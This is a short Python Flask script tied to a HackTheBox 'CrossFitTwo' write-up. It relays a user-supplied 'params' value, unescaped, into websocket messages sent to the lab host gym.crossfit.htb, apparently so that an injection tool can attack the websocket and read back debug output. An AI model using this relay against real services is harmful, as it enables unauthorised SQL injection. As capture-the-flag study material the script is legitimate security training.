#!/usr/bin/env python3

######
####################################
## https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html
####################################
######

import json
import signal
import websocket
from flask import *


app = Flask(__name__)


@app.route("/")
def index():
    ws = websocket.create_connection('ws://gym.crossfit.htb/ws/')
    data = ws.recv()
    token = json.loads(data)['token']
    params = request.args['params']
    ws.send(f'{{"message":"available","params":"{params}", "token": "{token}"}}')
    data = ws.recv()
    return json.loads(data)['debug']


if __name__ == "__main__":
    app.run(debug=True)
